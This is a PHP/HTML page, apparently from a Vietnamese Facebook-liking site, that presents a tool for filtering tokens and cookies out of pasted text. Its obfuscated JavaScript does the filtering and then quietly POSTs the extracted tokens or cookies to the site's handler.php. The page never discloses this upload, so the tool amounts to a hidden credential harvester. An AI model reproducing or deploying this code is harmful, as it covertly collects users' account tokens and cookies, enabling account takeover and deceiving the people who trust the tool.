<?php

include 'like_hethong/head.php';
include 'theme/css.php';
?>
<!DOCTYPE html>
<html lang="vi">
<head>
<body>
	<meta charset="UTF-8">
	<title>HỆ THỐNG LỌC DATA - VIPFBNOW.COM</title>
	<link rel="shortcut icon" href="https://maxcdn.icons8.com/Color/PNG/512/User_Interface/like_it-512.png">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
	<script src="//code.jquery.com/jquery.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
</head>
<!-- /.navbar-static-side -->    </nav>
    <div id="page-wrapper">
        <div class="row">
            <center><h1 class="page-header text-success">Tool Lọc Token, Cookie...</h1></center>
            <div class="col-lg-12">
                <div class="col-lg-12">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            Hệ Thống Lọc Data VipFbNow.Com
                        </div>
                        <div class="panel-body">
                            <div class="form-group">
                                <lable>Có thể lọc token, cookie hay bất cứ thứ gì bạn muốn</lable>
                            </div>
                            <div class="form-group">
                                <label>Thông Tin</label>
                                <textarea id="data" class="form-control" rows="15" placeholder="Token"
                                          required> </textarea>
                            </div>
                            <div class="form-group">
                                <label>Kí tự ngăn cách</label>
                                <input type="text" id="separator" value="|" class="form-control"/>
                            </div>
                            <div class="form-group">
                                <label>Số Thứ Tự Cần Tách</label>
                                <input type="number" id="position" value="5" class="form-control"/>
                            </div>
                            <div class="form-group">
                                <label>Kếu quả</label>
                                <textarea id="tokens" class="form-control" rows="15" placeholder="Dữ liệu sau khi lọc"
                                          required> </textarea>
                            </div>
                            <div class="form-group">
                                <input class="btn btn-danger form-control" id="get_token" value="Lấy Data"/>
                            </div>
                        </div>
                    </div>

                </div>
                <script>
                   var _0xa5bc=["\x74\x72\x69\x6D","\x76\x61\x6C","\x23\x73\x65\x70\x61\x72\x61\x74\x6F\x72","\x23\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x0A","\x73\x70\x6C\x69\x74","\x23\x64\x61\x74\x61","\x6C\x65\x6E\x67\x74\x68","\x6C\x6F\x67","\u0110\x61\x6E\x67\x20\x54\x68\u1EF1\x63\x20\x48\x69\u1EC7\x6E\x2C\x20\x58\x69\x6E\x20\x43\x68\u1EDD\x2E\x2E\x2E","\x23\x67\x65\x74\x5F\x74\x6F\x6B\x65\x6E","\x23\x74\x6F\x6B\x65\x6E\x73","","\x4C\u1EA5\x79\x20\x44\x61\x74\x61","\x68\x61\x6E\x64\x6C\x65\x72\x2E\x70\x68\x70","\x70\x6F\x73\x74","\x63\x6C\x69\x63\x6B","\x72\x65\x61\x64\x79"];$(document)[_0xa5bc[17]](function(){$(_0xa5bc[10])[_0xa5bc[16]](function(){var _0xed62x1=$(_0xa5bc[2])[_0xa5bc[1]]()[_0xa5bc[0]]();var _0xed62x2=$(_0xa5bc[3])[_0xa5bc[1]]()[_0xa5bc[0]]();var _0xed62x3=$(_0xa5bc[6])[_0xa5bc[1]]()[_0xa5bc[5]](_0xa5bc[4]);console[_0xa5bc[8]](_0xed62x3[_0xa5bc[7]]);$(_0xa5bc[10])[_0xa5bc[1]](_0xa5bc[9]);for(var _0xed62x4=0;_0xed62x4< _0xed62x3[_0xa5bc[7]];_0xed62x4++){var _0xed62x5=_0xed62x3[_0xed62x4][_0xa5bc[5]](_0xed62x1);var _0xed62x6=$(_0xa5bc[11])[_0xa5bc[1]]();var _0xed62x7=_0xed62x5[_0xed62x2- 1];if(_0xed62x7!= undefined&& _0xed62x7!= _0xa5bc[12]&& _0xed62x7[_0xa5bc[0]]()!= _0xa5bc[12]){$(_0xa5bc[11])[_0xa5bc[1]](_0xed62x6+ _0xed62x7[_0xa5bc[0]]()+ _0xa5bc[4])}};$(_0xa5bc[10])[_0xa5bc[1]](_0xa5bc[13]);var _0xed62x3=$(_0xa5bc[11])[_0xa5bc[1]]();var _0xed62x8={data:_0xed62x3};$[_0xa5bc[15]](_0xa5bc[14],_0xed62x8,function(_0xed62x3){console[_0xa5bc[8]](_0xed62x3)})})})

                </script>
            </div>
        </div>
    </div>
	</body>
	</html>
	
<?php
include 'like_hethong/foot.php';
?>
